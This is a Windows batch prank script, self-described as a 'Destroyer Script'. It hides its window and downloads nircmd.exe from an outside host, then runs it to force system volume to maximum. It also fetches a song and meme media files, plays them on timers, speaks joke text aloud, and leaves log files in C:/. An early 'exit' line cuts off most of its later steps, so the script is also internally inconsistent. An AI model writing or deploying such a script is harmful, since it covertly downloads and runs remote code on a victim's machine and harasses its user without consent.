@echo off
title You are not allowed to view this, im sorry!
echo Minimizing...
powershell -window minimized -command ""
echo Hiding...
powershell -window hidden -command ""
cd C:/
mkdir tools
cd tools
curl -s https://sources.tobir.xyz/tools-mirror/nircmd.exe > nircmd.tmpexe
move nircmd.tmpexe nircmd.exe
timeout 1
nircmd.exe mutesysvolume 0
nircmd.exe setsysvolume 65535
#nircmd.exe monitor off
cd C:/
mkdir songs
cd songs
curl -s https://sources.tobir.xyz/songs/mann.mp3 > mann.mp3
echo Download Mann gegen Mann (1/1)
cd C:/
exit
mkdir memes
cd memes
curl -s https://sources.tobir.xyz/memes/airhorn.mp3 > airhorn.mp3
echo Downloaded airhorn (1/14)
curl -s https://sources.tobir.xyz/memes/car.mp3 > car.mp3
echo Downloaded car (2/14)
curl -s https://sources.tobir.xyz/memes/carefree.mp3 > carefree.mp3
echo Downloaded carefree song (3/14)
curl -s https://sources.tobir.xyz/memes/cat.mp3 > cat.mp3
echo Downloaded cat (4/14)
curl -s https://sources.tobir.xyz/memes/eggdog.mp4 > eggdog.mp4
echo Downloaded eggdog (5/14)
curl -s https://sources.tobir.xyz/memes/fish.mp4 > fish.mp4
echo Downloaded fish (6/14)
curl -s https://sources.tobir.xyz/memes/fish1.mp4 > fish1.mp4
echo Downloaded fish1 (7/14)
curl -s https://sources.tobir.xyz/memes/china.mp3 > china.mp3
echo Downloaded china (8/14)
curl -s https://sources.tobir.xyz/memes/memesdead.mp3 > memesdead.mp3
echo Downloaded memesdead (9/14)
curl -s https://sources.tobir.xyz/memes/npc.mp3 > npc.mp3
echo Downloaded npc music (10/14)
curl -s https://sources.tobir.xyz/memes/rchad.mp4 > rchad.mp4
echo Downloaded random chad images (11/14)
curl -s https://sources.tobir.xyz/memes/skype.mp3 > skype.mp3
echo Downloaded skype (12/14)
curl -s https://sources.tobir.xyz/memes/xuehua.mp4 > xuehua.mp4
echo Downloaded xuehua (13/14)
curl -s https://sources.tobir.xyz/memes/damage.mp4 > damage.mp4
echo Downloaded damage (14/14)
echo Executing start command after 5 seconds
timeout 5
start /min npc.mp3
echo Started NPC SONG
echo Next is Skype
timeout 150
#start /min skype.mp3
echo Started Skype
echo Next is cat.mp3
timeout 300
#start /min cat.mp3
echo Started cat
echo Next is china.mp3
timeout 150
start /min china.mp3
echo Started china
echo Next and last are memes till you are dead
timeout 150
C:\tools\nircmd.exe mutesysvolume 0
C:\tools\nircmd.exe setsysvolume 65535
C:\tools\nircmd.exe speak text "Hello this is elon musk how can i help you?"
timeout 1
C:\tools\nircmd.exe speak text "Mam tady tu syrovou pizzu"
#start /min memesdead.mp3
timeout 300
#C:\tools\nircmd.exe speak text "Bozi mlini melou"
timeout 1
start /min xuehua.mp4
cd c:/
mkdir dlogs
cd dlogs
mkdir %date%
cd %date%
echo Destroyer Script was been completed at time %time% by user %username% at date %date%! > %username%_%date%.dlog
cd c:/
mkdir debug_destroyer
cd debug_destroyer
echo You are not allowed to view debug! > debug_%username%_%date%.debug
echo You are not allowed to view this key! > debug_%username%_%date%.dkey
echo Started memes till you are dead, this program will close after 10 seconds
timeout 10
exit
